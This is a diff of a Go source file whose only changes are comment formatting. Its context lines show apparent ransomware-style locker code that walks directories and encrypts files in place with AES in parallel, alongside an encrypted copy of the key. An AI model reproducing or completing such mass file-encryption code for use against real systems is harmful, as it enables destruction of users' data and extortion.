@@ -14,7 +14,7 @@ import (
 var pl = fmt.Println
 
 func LockFilesInDir(startDirPath string, skipHiddenDirs bool, encryptedAESKey []byte, AESKey []byte) error {
-	//scan only non hidden directories
+	// scan only non hidden directories
 	runtime.GOMAXPROCS(runtime.NumCPU() / 2)
 	// filesToEncrypt := ScanFilesInDirWithLockAdd(startDirPath, skipHiddenDirs, encryptedAESKey)
 	filesToEncrypt, err := scan.ScanFilesInDirWithLockAdd(startDirPath, skipHiddenDirs, encryptedAESKey)
@@ -43,7 +43,7 @@ func LockFilesInDir(startDirPath string, skipHiddenDirs bool, encryptedAESKey []
 
 func RunEncryptForCurrentDir(encryptedAESKey []byte, AESKey []byte) (fileList []string, err error) {
 
-	//get pwd
+	// get pwd
 	currentDir, err := os.Getwd()
 	if err != nil {
 		return nil, err
@@ -82,7 +82,7 @@ func GetListOfAccessibleFiles(fileList []string) []string {
 }
 
 func LockFilesArray(filesToEncrypt []string, AESKey []byte) {
-	//scan only non hidden directories
+	// scan only non hidden directories
 
 	// runtime.GOMAXPROCS(16)
 	numCPU := runtime.NumCPU()
@@ -100,7 +100,7 @@ func LockFilesArray(filesToEncrypt []string, AESKey []byte) {
 		// wait until there's room for another goroutine to start
 		for j := 0; j < numCPU && i+j < len(filesToEncrypt); j++ {
 			wg.Add(1)
-			//TODO: Make an error chanel and listen to it
+			// TODO: Make an error chanel and listen to it
 			go func(index int) error {
 				defer wg.Done()
 				_, err := enc.EncryptFileAES(AESKey, filesToEncrypt[index])
@@ -114,9 +114,9 @@ func LockFilesArray(filesToEncrypt []string, AESKey []byte) {
 
 		}
 
-		//log the progress in percent
+		// log the progress in percent
 		percent := (float64(i) / float64(len(filesToEncrypt))) * 100
-		//print progress in percent, limit to 2 decimal places
+		// print progress in percent, limit to 2 decimal places
 		fmt.Printf("Progress: %.2f%%\r", percent)
 		wg.Wait()
 	}
